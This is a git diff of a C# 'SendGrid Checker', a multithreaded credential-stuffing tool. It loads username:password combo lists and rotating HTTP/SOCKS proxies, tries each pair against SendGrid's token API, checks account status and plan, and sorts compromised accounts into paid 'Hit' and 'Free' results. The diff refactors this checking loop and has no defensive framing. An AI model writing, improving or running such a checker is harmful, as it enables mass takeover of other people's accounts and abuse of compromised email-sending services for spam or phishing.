@@ -11,31 +11,28 @@ namespace SendGrid_Checker
     class Program
     {
         [STAThread]
-        static void Main(string[] args)
+        static void Main()
         {
             var Milky = new MilkyManager();
-            Milky.ProgramManager.Initialize("SendGrid Checker", "1.0.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");
+            Milky.ProgramManager.Initialize("SendGrid Checker", "1.1", "Laiteux", "https://pastebin.com/raw/QW82zeqi");
+            Milky.ConsoleSettings.SetTitleStyle(true, true);
+
+            Milky.FileUtils.LoadCombos("Username:Password");
+            Milky.FileUtils.LoadProxies(Milky.RunSettings.proxyProtocol);
 
             var threads = Milky.UserUtils.AskInteger("Threads");
             Milky.RunSettings.threads = threads;
             ThreadPool.SetMinThreads(threads, threads);
-            
-            Milky.RunSettings.proxyProtocol = Milky.UserUtils.AskChoice("Proxy Protocol", new string[] { "HTTP", "SOCKS4", "SOCKS5" });
-            
-            Milky.FileUtils.LoadCombos("Username:Password");
-            Milky.FileUtils.LoadProxies(Milky.RunSettings.proxyProtocol);
 
-            Milky.ConsoleSettings.SetTitleStyle(true, true);
+            Milky.RunSettings.proxyProtocol = Milky.UserUtils.AskChoice("Proxy Protocol", new string[] { "HTTP", "SOCKS4", "SOCKS5" });
 
             Milky.RunManager.StartRun();
-
-            var random = new Random();
 
             Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
             {
                 var splittedCombo = combo.Split(':');
 
-                var resultType = ResultType.Invalid;
+                var resultType = ResultType.Unknown;
                 var captures = new CaptureDictionary();
 
                 if (splittedCombo.Length == 2)
@@ -43,45 +40,51 @@ namespace SendGrid_Checker
                     var login = splittedCombo[0];
                     var password = splittedCombo[1];
 
-                    while (resultType == ResultType.Invalid)
+                    while (resultType == ResultType.Unknown)
                     {
-                        var request = Milky.RequestUtils.SetProxy(new MilkyRequest()
-                        {
-                            Cookies = new CookieDictionary()
-                        });
-
                         try
                         {
+                            var request = Milky.RequestUtils.SetProxy(new MilkyRequest());
+
                             request.AddHeader("Content-Type", "application/json");
 
-                            var response1 = Milky.RequestUtils.Execute(request,
+                            var publicTokensResponse = Milky.RequestUtils.Execute(request,
                                 HttpMethod.POST, "https://api.sendgrid.com/v3/public/tokens",
-                                "{\"username\":\"" + login + "\",\"password\":\"" + password + "\"}");
-                            var source1 = response1.ToString();
-                            var json1 = JsonConvert.DeserializeObject<dynamic>(source1);
+                                "{\"username\":\"" + Uri.EscapeDataString(login) + "\",\"password\":\"" + Uri.EscapeDataString(password) + "\"}");
+                            var publicTokensSource = publicTokensResponse.ToString();
+                            var publicTokensJSON = JsonConvert.DeserializeObject<dynamic>(publicTokensSource);
 
-                            if (json1.token != null)
+                            if (publicTokensJSON.token != null)
                             {
-                                request.AddHeader("Authorization", "token " + json1.token);
+                                request.Authorization = $"token {publicTokensJSON.token}";
 
-                                var response2 = Milky.RequestUtils.Execute(request,
-                                    HttpMethod.GET,
-                                    "https://api.sendgrid.com/v3/user/package");
-                                var source2 = response2.ToString();
-                                var json2 = JsonConvert.DeserializeObject<dynamic>(source2);
+                                var userStatusResponse = Milky.RequestUtils.Execute(request, HttpMethod.GET, "https://api.sendgrid.com/v3/user/status");
+                                var userStatusSource = userStatusResponse.ToString();
+                                var userStatusJSON = JsonConvert.DeserializeObject<dynamic>(userStatusSource);
 
-                                captures.Add("Package", (string)json2.name);
+                                if (userStatusJSON.status == "active")
+                                {
+                                    var userPackageResponse = Milky.RequestUtils.Execute(request, HttpMethod.GET, "https://api.sendgrid.com/v3/user/package");
+                                    var userPackageSource = userPackageResponse.ToString();
+                                    var userPackageJSON = JsonConvert.DeserializeObject<dynamic>(userPackageSource);
 
-                                resultType = json2.plan_type == "free" ? ResultType.Free : ResultType.Hit;
+                                    captures.Add("Package", (string)userPackageJSON.name);
+
+                                    resultType = userPackageJSON.plan_type == "free" ? ResultType.Free : ResultType.Hit;
+                                }
+                                else
+                                {
+                                    resultType = ResultType.Invalid;
+                                }
                             }
-                            else if(source1.Contains("authorization required") || source1.Contains("access forbidden") || source1.Contains("bad request") || source1.Contains("required"))
+                            else if (publicTokensSource.Contains("access forbidden") || publicTokensSource.Contains("required") || publicTokensSource.Contains("bad request"))
                             {
-                                break;
+                                resultType = ResultType.Invalid;
                             }
+
+                            request.Dispose();
                         }
                         catch { }
-
-                        request.Dispose();
                     }
                 }
 
